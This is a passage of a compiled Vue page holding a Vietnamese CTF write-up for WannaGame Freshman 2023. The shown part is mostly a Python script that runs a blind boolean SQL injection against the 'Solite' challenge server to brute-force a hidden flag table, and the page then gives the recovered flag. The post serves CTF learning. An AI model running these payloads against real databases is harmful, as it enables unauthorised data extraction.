                    createBaseVNode("span", { class: "line" }, "URL_FLAG_CHECK: ?name[]=1' AND (SELECT hex(flag) FROM flag_c1abd148_acae_40be_a953_eae333f90da0 WHERE flag LIKE '{}%') > '0';--"),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, "  - {} is flag"),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, "- Server will return [] if something wrong"),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, '"""')
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("URL_LENGTH_CHECK "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, `"http://45.122.249.68:20020/search?name[]=1'+AND+(SELECT+length(flag)+FROM+flag_c1abd148_acae_40be_a953_eae333f90da0)+>+{}%3b--"`)
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("URL_FLAG_CHECK "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, `"http://45.122.249.68:20020/search?name[]=1'+AND+(SELECT+hex(flag)+FROM+flag_c1abd148_acae_40be_a953_eae333f90da0+WHERE+flag+LIKE+'{}%25')+>+'0'%3b--"`)
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("CHARS "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, '"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@$^*()_+{}[];\':\\",./<>?\\\\|`~"')
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("flag "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createBaseVNode("span", { class: "token punctuation" }, "]")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("flagLength "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token number" }, "0")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createBaseVNode("span", { class: "token keyword" }, "def"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token function" }, "getFlagLength"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ":")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    i "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token number" }, "5")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    "),
                    createBaseVNode("span", { class: "token keyword" }, "while"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token boolean" }, "True"),
                    createBaseVNode("span", { class: "token punctuation" }, ":")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("        r "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(" requests"),
                    createBaseVNode("span", { class: "token punctuation" }, "."),
                    createTextVNode("get"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("url"),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode("URL_LENGTH_CHECK"),
                    createBaseVNode("span", { class: "token punctuation" }, "."),
                    createBaseVNode("span", { class: "token builtin" }, "format"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("i"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ")")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("        "),
                    createBaseVNode("span", { class: "token keyword" }, "if"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("r"),
                    createBaseVNode("span", { class: "token punctuation" }, "."),
                    createTextVNode("text "),
                    createBaseVNode("span", { class: "token operator" }, "=="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, '"[]"'),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ":")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("            "),
                    createBaseVNode("span", { class: "token keyword" }, "return"),
                    createTextVNode(" i")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, "        "),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("        i "),
                    createBaseVNode("span", { class: "token operator" }, "+="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token number" }, "1")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createBaseVNode("span", { class: "token keyword" }, "def"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token function" }, "check"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("index"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ":")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    currentFlag "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createBaseVNode("span", { class: "token operator" }, "*"),
                    createTextVNode("flag"),
                    createBaseVNode("span", { class: "token punctuation" }, "]")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    "),
                    createBaseVNode("span", { class: "token keyword" }, "for"),
                    createTextVNode(" char "),
                    createBaseVNode("span", { class: "token keyword" }, "in"),
                    createTextVNode(" chars"),
                    createBaseVNode("span", { class: "token punctuation" }, ":")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("        currentFlag"),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createTextVNode("index"),
                    createBaseVNode("span", { class: "token punctuation" }, "]"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(" char")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("        r "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(" requests"),
                    createBaseVNode("span", { class: "token punctuation" }, "."),
                    createTextVNode("get"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("url"),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode("URL_FLAG_CHECK"),
                    createBaseVNode("span", { class: "token punctuation" }, "."),
                    createBaseVNode("span", { class: "token builtin" }, "format"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createBaseVNode("span", { class: "token string" }, "''"),
                    createBaseVNode("span", { class: "token punctuation" }, "."),
                    createTextVNode("join"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("currentFlag"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ")")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("        "),
                    createBaseVNode("span", { class: "token keyword" }, "if"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("r"),
                    createBaseVNode("span", { class: "token punctuation" }, "."),
                    createTextVNode("text "),
                    createBaseVNode("span", { class: "token operator" }, "!="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, '"[]"'),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ":")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("            flag"),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createTextVNode("index"),
                    createBaseVNode("span", { class: "token punctuation" }, "]"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(" char")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("            "),
                    createBaseVNode("span", { class: "token keyword" }, "print"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("flag"),
                    createBaseVNode("span", { class: "token punctuation" }, ")")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("            "),
                    createBaseVNode("span", { class: "token keyword" }, "return")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createBaseVNode("span", { class: "token keyword" }, "if"),
                    createTextVNode(" __name__ "),
                    createBaseVNode("span", { class: "token operator" }, "=="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, '"__main__"'),
                    createBaseVNode("span", { class: "token punctuation" }, ":")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    flagLength "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(" getFlagLength"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createBaseVNode("span", { class: "token punctuation" }, ")")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    flag "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, "]"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token operator" }, "*"),
                    createTextVNode(" flagLength")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    flag"),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createBaseVNode("span", { class: "token number" }, "0"),
                    createBaseVNode("span", { class: "token punctuation" }, "]"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'W'")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    flag"),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createBaseVNode("span", { class: "token number" }, "1"),
                    createBaseVNode("span", { class: "token punctuation" }, "]"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'1'")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    flag"),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createBaseVNode("span", { class: "token number" }, "2"),
                    createBaseVNode("span", { class: "token punctuation" }, "]"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'{'")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    flag"),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createBaseVNode("span", { class: "token operator" }, "-"),
                    createBaseVNode("span", { class: "token number" }, "1"),
                    createBaseVNode("span", { class: "token punctuation" }, "]"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'}'")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    "),
                    createBaseVNode("span", { class: "token keyword" }, "for"),
                    createTextVNode(" i "),
                    createBaseVNode("span", { class: "token keyword" }, "in"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token builtin" }, "range"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createBaseVNode("span", { class: "token number" }, "3"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token builtin" }, "len"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("flag"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token operator" }, "-"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token number" }, "1"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ":")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("        Thread"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("target"),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createBaseVNode("span", { class: "token keyword" }, "lambda"),
                    createBaseVNode("span", { class: "token punctuation" }, ":"),
                    createTextVNode(" check"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("i"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, "."),
                    createTextVNode("start"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createBaseVNode("span", { class: "token punctuation" }, ")")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" })
                ])
              ]),
              createBaseVNode("div", {
                class: "line-numbers",
                "aria-hidden": "true",
                style: { "counter-reset": "line-number 0" }
              }, [
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" })
              ])
            ], -1)
          ])),
          _: 1
        })
      ]),
      _: 1
    }),
    _cache[12] || (_cache[12] = createBaseVNode("p", null, [
      createBaseVNode("br"),
      createBaseVNode("strong", null, "FLAG:"),
      createTextVNode(),
      createBaseVNode("code", null, "W1{i_th1nk_u_r_so_lite^_^}"),
      createBaseVNode("br")
    ], -1)),
    _cache[13] || (_cache[13] = createBaseVNode("h1", {
      id: "",
      tabindex: "-1"
    }, [
      createBaseVNode("a", {
        class: "header-anchor",
        href: "#"
      }, [
        createBaseVNode("span")
      ])
    ], -1)),
    _cache[14] || (_cache[14] = createBaseVNode("p", null, "Tóm tắt lại giải Freshman năm nay rất là chất lượng. Không chỉ từ đề thi mà các anh chị cũng rất thân thiện, tận tình với đứa như em 😦. Mặc dù chỉ solve được 2/5 bài web trong thời gian 8 tiếng, hơi tiếc là bài Solite mình đã không thể giải quyết nốt trong thời gian còn lại.", -1))
  ]);
}
const wannagameFreshman2023_html = /* @__PURE__ */ _export_sfc(_sfc_main, [["render", _sfc_render], ["__file", "wannagame-freshman-2023.html.vue"]]);
const data = JSON.parse('{"path":"/blogs/CTF/2023/wannagame-freshman-2023.html","title":"WannaGame Freshman 2023","lang":"en-US","frontmatter":{"title":"WannaGame Freshman 2023","date":"2023-11-11T00:00:00.000Z","tags":["SQLi","SSTI"],"categories":["CTF"]},"headers":[{"level":2,"title":"WEB: Warmup PHP","slug":"web-warmup-php","link":"#web-warmup-php","children":[]},{"level":2,"title":"WEB: NAMENAME","slug":"web-namename","link":"#web-namename","children":[]},{"level":2,"title":"WEB: Solite","slug":"web-solite","link":"#web-solite","children":[]}],"git":{"createdTime":1734340044000,"updatedTime":1734340044000,"contributors":[{"name":"Phan Nguyen Huy Duy","email":"pnhd.dyh@gmail.com","commits":1}]},"filePathRelative":"blogs/CTF/2023/wannagame-freshman-2023.md"}');
export {
  wannagameFreshman2023_html as comp,
  data
};
